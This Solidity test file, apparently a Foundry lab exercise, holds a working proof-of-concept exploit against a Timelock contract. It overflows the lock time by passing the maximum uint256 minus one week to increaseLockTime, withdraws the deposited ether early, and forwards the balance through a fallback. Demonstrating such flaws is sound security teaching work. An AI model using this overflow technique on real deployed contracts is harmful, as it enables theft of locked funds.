// SPDX-License-Identifier: UNLICENSED
pragma abicoder v2;
pragma solidity 0.7.6;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../src/Timelock.sol";

interface ITimelock {
    function deposit() external payable;
    function withdraw() external; 
    function getBalance() external view returns (uint256);
    function increaseLockTime(uint256 _secondsToIncrease) external;
}


contract TimelockTest is Test {

    Timelock public timelock;
    address bob = makeAddr("bob");

    function setUp() public {
        timelock = new Timelock();
        vm.startPrank(bob);
        vm.deal(bob, 10 ether);
    }
        function testAttacker() public payable {
        /// We send the deposit to the contract and calculate de max value for uint256
        timelock.deposit{value: 1 ether}();   
        uint256 MAX_INT = 2 ** 256-1;
        /* We need to make locktime[tx.origin] < 1, to skip the require(lockTime[tx.origin] < block.timestamp)
          We substract the value equal to block.timestamp + 1 weeks do do it so lockTime[tx.origin] will be equal to zero
        */
        uint256 overflowMaker = uint256(MAX_INT - 604800);
        /// We send the value so we can recover our funds
        timelock.increaseLockTime(overflowMaker);
        /// Bob ask for his ether back
        timelock.withdraw();       
    }
    fallback() external payable {

        /// We send the ether to bob
        (bool sent, ) = bob.call{value: address(this).balance}("");
        require(sent, "Fail ether transfer");
    }

}


